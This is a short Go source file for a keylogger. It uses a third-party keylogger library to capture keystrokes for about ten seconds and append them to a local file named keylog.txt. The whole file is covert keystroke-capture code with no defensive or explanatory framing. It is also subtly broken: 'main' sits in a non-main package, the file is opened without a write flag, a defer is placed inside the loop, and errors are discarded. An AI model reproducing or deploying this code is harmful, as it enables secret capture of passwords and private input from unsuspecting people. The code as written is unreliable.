package util

import (
	"os"
	"time"

	"github.com/kindlyfire/go-keylogger"
)

const (
	delayKey = 10
)

func main() {
	kl := keylogger.NewKeylogger()
	file, _ := os.OpenFile("keylog.txt", os.O_APPEND|os.O_CREATE, 0666)
	startTime := time.Now()
	for {

		key := kl.GetKey()

		if !key.Empty {

			defer file.Close()
			_, _ = file.WriteString(string(key.Rune))
		}
		if time.Since(startTime) > 10*time.Second {
			break
		}

		time.Sleep(delayKey * time.Millisecond)
	}
}
